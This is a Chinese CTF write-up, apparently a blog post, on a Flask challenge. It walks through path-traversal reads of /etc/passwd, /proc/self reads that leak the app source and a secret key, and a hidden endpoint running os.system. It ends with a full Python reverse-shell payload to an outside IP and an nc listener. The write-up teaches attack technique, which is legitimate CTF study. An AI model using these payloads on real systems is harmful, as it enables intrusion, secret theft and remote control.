    <content type="html"><![CDATA[<h1 id="反弹shell以及proc虚拟文件系统"><a href="#反弹shell以及proc虚拟文件系统" class="headerlink" title="反弹shell以及proc虚拟文件系统"></a>反弹shell以及proc虚拟文件系统</h1><p>打开页面，发现是一个输入框，所以随便输入一些东西进去，发现有一个get提交的url参数，我们试着构造</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/page?url=../../../../../etc/passwd</span><br></pre></td></tr></table></figure><p>发现可以读取信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:100:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">app:x:1000:1000::/home/app:/bin/sh</span><br></pre></td></tr></table></figure><p>所以我们可以尝试读取flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/page?url=../../../../../flag</span><br></pre></td></tr></table></figure><p>发现可以读取flag</p><p>当然了，如果flag不在这个目录下怎么办呢？我们可以尝试利用proc系统</p><h2 id="Linuc下的proc-pid-信息说明"><a href="#Linuc下的proc-pid-信息说明" class="headerlink" title="Linuc下的proc/pid/信息说明"></a>Linuc下的proc/pid/信息说明</h2><p>proc是一个虚拟文件系统，它挂载于Linux系统中的/proc目录之上，它有多个功能，其中一个重要的功能是用户可以通过它访问内核信息或排错</p><h3 id="进程信息"><a href="#进程信息" class="headerlink" title="进程信息"></a>进程信息</h3><p>在/proc文件系统中，每个进程都有一个相应的文件，以下是/proc目录下的一些重要文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">/proc/pid/cmdline：包含了用于开始进程的命令</span><br><span class="line"></span><br><span class="line">/proc/pid/cwd：包含了当前进程工作目录的一个链接</span><br><span class="line"></span><br><span class="line">/proc/pid/environ：包含了可用进程环境变量的列表</span><br><span class="line"></span><br><span class="line">/proc/pid/exe：包含了正在进程中运行的程序链接</span><br><span class="line"></span><br><span class="line">/proc/pid/fd/：这个目录包含了进程打开的每一个文件的链接</span><br><span class="line"></span><br><span class="line">/proc/pid/mem：包含了进程在内存中的内容</span><br><span class="line"></span><br><span class="line">/proc/pid/stat：包含了进程的状态信息</span><br><span class="line"></span><br><span class="line">/proc/pid/statm：包含了进程的内存使用信息</span><br></pre></td></tr></table></figure><p>其中的pid一般是端口号或者是self，可以在本地ubuntu使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /proc/</span><br></pre></td></tr></table></figure><p>来查看里面的信息</p><h3 id="proc目录的大致介绍"><a href="#proc目录的大致介绍" class="headerlink" title="/proc目录的大致介绍"></a>/proc目录的大致介绍</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1. 【number】：在/proc目录下，每个正在运行的进程都有一个以该进程ID命名的子目录</span><br><span class="line"></span><br><span class="line">2. 【number】/cmdline：该文件保存了进程的完整命令，如果该进程已经被交换出内存或僵死，则该文件为空</span><br><span class="line"></span><br><span class="line">3. 【number】/cwd：一个符号连接，指向进程当前工作目录</span><br><span class="line"></span><br><span class="line">4. 【number】/environ：该环境保存进程的环境变量，各项之间以空字符作为间隔，结尾也可能是一个空字符，可以使用echo /proc/1/environ来查看1进程的环境变量</span><br><span class="line"></span><br><span class="line">5. 【number】/exe：是一个符号连接，指向被执行的二进制代码，在Linux2.0或更加版本的下，对exe特殊文件的readlink(2)返回一个如下格式的字符串：[设备号]:节点号</span><br><span class="line"> 6. 【number】/fd：进程所打开的每个文件都有一个符号连接在该子目录下，以文件描述符命名，这个名字实际上是指向真正的文件符号连接</span><br></pre></td></tr></table></figure><p>[/proc虚拟文件系统的详细说明][<a href="https://blog.csdn.net/shenhuxi_yu/article/details/79697792]">https://blog.csdn.net/shenhuxi_yu/article/details/79697792]</a></p><p>所以回到题目本身，我们可以构造</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/page?url=/proc/self/cmdline</span><br></pre></td></tr></table></figure><p>来查看开始进程命令为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 app.py</span><br></pre></td></tr></table></figure><p>所以我们可以构造</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/page?url=/proc/self/cwd/app.py</span><br></pre></td></tr></table></figure><p>来读取app.py文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask, Response</span><br><span class="line">from flask import render_template</span><br><span class="line">from flask import request</span><br><span class="line">import os</span><br><span class="line">import urllib</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">SECRET_FILE = &quot;/tmp/secret.txt&quot;</span><br><span class="line">f = open(SECRET_FILE)</span><br><span class="line">SECRET_KEY = f.read().strip()</span><br><span class="line">os.remove(SECRET_FILE)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def index():</span><br><span class="line">    return render_template(&#x27;search.html&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/page&#x27;)</span><br><span class="line">def page():</span><br><span class="line">    url = request.args.get(&quot;url&quot;)</span><br><span class="line">    try:</span><br><span class="line">        if not url.lower().startswith(&quot;file&quot;):</span><br><span class="line">            res = urllib.urlopen(url)</span><br><span class="line">            value = res.read()</span><br><span class="line">            response = Response(value, mimetype=&#x27;application/octet-stream&#x27;)</span><br><span class="line">            response.headers[&#x27;Content-Disposition&#x27;] = &#x27;attachment; filename=beautiful.jpg&#x27;</span><br><span class="line">            return response</span><br><span class="line">        else:</span><br><span class="line">            value = &quot;HACK ERROR!&quot;</span><br><span class="line">    except:</span><br><span class="line">        value = &quot;SOMETHING WRONG!&quot;</span><br><span class="line">    return render_template(&#x27;search.html&#x27;, res=value)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/no_one_know_the_manager&#x27;)</span><br><span class="line">def manager():</span><br><span class="line">    key = request.args.get(&quot;key&quot;)</span><br><span class="line">    print(SECRET_KEY)</span><br><span class="line">    if key == SECRET_KEY:</span><br><span class="line">        shell = request.args.get(&quot;shell&quot;)</span><br><span class="line">        os.system(shell)</span><br><span class="line">        res = &quot;ok&quot;</span><br><span class="line">    else:</span><br><span class="line">        res = &quot;Wrong Key!&quot;</span><br><span class="line"></span><br><span class="line">    return res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;, port=8080)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>通过这串代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">key = request.args.get(&quot;key&quot;)</span><br><span class="line">    print(SECRET_KEY)</span><br><span class="line">    if key == SECRET_KEY:</span><br></pre></td></tr></table></figure><p>可知，我们需要知道key是什么，所以我们可以使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/page?url=/proc/self/fd/[number]</span><br></pre></td></tr></table></figure><p>命令来读取进程打开的每一个文件，其中通过测试number为3，即</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/page?url=/proc/self/fd/3</span><br></pre></td></tr></table></figure><p>发现key，然后经过url编码为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C7ueFsNl0ianR6uxTgIqepkLxQDSp0OE5pyPl51XA%2F4%3D</span><br></pre></td></tr></table></figure><p>然后通过这串代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">os.system(shell)</span><br><span class="line">       res = &quot;ok&quot;</span><br><span class="line">   else:</span><br><span class="line">       res = &quot;Wrong Key!&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可知，我们可以构造shell参数，来使用反弹shell，由于系统是python文件，所以我们需要一个python写的反弹shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;118.***.***.***&quot;,39555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br></pre></td></tr></table></figure><p>其中ip部分写自己的服务器的公网ip，端口可以写7777，然后在服务器的命令行可以输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 7777</span><br></pre></td></tr></table></figure><p>来监控7777端口，接受反弹shell，但是我的阿里云的服务器用不了，很气人，推荐腾讯云，所以我们可以构造payload，其中shell参数的值需要url编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/no_one_know_the_manager?key=C7ueFsNl0ianR6uxTgIqepkLxQDSp0OE5pyPl51XA%2F4%3D&amp;shell=python3%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket(socket.AF_INET%2Csocket.SOCK_STREAM)%3Bs.connect((%2247.242.68.88%22%2C7777))%3Bos.dup2(s.fileno()%2C0)%3B%20os.dup2(s.fileno()%2C1)%3B%20os.dup2(s.fileno()%2C2)%3Bp%3Dsubprocess.call(%5B%22%2Fbin%2Fsh%22%2C%22-i%22%5D)%3B%27</span><br></pre></td></tr></table></figure><p>然后就可以获得shell了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;反弹shell以及proc虚拟文件系统&quot;&gt;&lt;a href=&quot;#反弹shell以及proc虚拟文件系统&quot; class=&quot;headerlink&quot; title=&quot;反弹shell以及proc虚拟文件系统&quot;&gt;&lt;/a&gt;反弹shell以及proc虚拟文件系统&lt;/h1&gt;&lt;p&gt;打开</summary>
      
    
    
    
    
    <category term="ssrf" scheme="http://example.com/tags/ssrf/"/>
    
  </entry>
  
</feed>
